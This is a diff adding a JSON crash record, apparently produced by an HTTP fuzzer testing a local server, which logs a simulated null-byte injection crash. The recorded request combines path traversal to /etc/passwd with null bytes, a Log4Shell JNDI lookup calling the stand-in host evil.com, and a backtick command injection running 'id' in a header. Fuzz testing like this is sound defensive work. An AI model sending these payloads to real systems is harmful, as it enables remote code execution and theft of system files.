@@ -1,0 +1,23 @@
+{
+  "timestamp": "2025-12-29T14:42:17.128180",
+  "crash_type": "null_byte_injection",
+  "payload": "DELETE /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-Proto': '` id `', 'X-Forwarded-Host': '\\x00', 'Content-Length': '0'}",
+  "payload_hash": "694f0bea34a05206",
+  "request_method": "DELETE",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-Proto": "` id `",
+    "X-Forwarded-Host": "\u0000",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated null_byte_injection",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 483
+}
